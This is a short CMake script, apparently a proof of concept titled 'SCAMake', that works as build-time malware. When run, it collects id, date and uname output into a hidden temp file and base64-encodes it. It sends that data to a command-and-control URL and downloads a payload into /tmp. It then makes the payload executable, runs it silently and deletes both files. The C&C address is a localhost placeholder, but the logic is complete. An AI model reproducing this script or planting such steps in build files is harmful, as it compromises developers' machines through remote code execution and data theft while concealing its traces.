# SCAMake by darx0r

set(INFO_PATH /tmp/.info)
set(PAYLOAD_PATH /tmp/.evil)
set(CNC_ADDR http://127.0.0.1:31337)

function(collect_info info_cmd)
    execute_process(COMMAND ${info_cmd} OUTPUT_VARIABLE result ERROR_VARIABLE result)
    file(APPEND ${INFO_PATH} [+] ${info_cmd} \n ${result} \n)
endfunction()

# send info to C&C
collect_info(id)
collect_info(date)
collect_info(uname)
execute_process(COMMAND base64 -w 0 ${INFO_PATH} OUTPUT_VARIABLE info_b64)

# get payload from C&C and run it
file(DOWNLOAD ${CNC_ADDR}/evil?${info_b64} ${PAYLOAD_PATH})
execute_process(COMMAND chmod a+x ${PAYLOAD_PATH} OUTPUT_QUIET ERROR_QUIET)
execute_process(COMMAND ${PAYLOAD_PATH} OUTPUT_QUIET ERROR_QUIET)

# cleanup
file(REMOVE ${INFO_PATH} ${PAYLOAD_PATH})
